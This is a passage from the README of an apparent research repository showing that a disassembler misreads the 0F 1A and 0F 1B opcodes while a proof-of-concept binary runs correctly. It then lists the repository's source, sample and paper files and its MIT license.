tool fails on the `0F 1A` and `0F 1B` opcodes, showing them as `db 0Fh, 1Ah...`, `undefined`, or `???`, effectively halting the analysis of the function.\n5.  Run `patched.exe`. It will execute flawlessly and print a success message, proving the instructions are valid.\n\n## Repository Structure\n\n-   `/src/`: The C++ source code used to generate the test binary.\n-   `/samples/`\n    -   `patched.exe`: The pre-compiled 64-bit PoC binary.\n-   `/papers/`:\n    -   `ru.pdf`: The full research paper (Russian).\n    -   `en.pdf`: The full research paper (English).\n\n## LICENSE\nMIT\n",
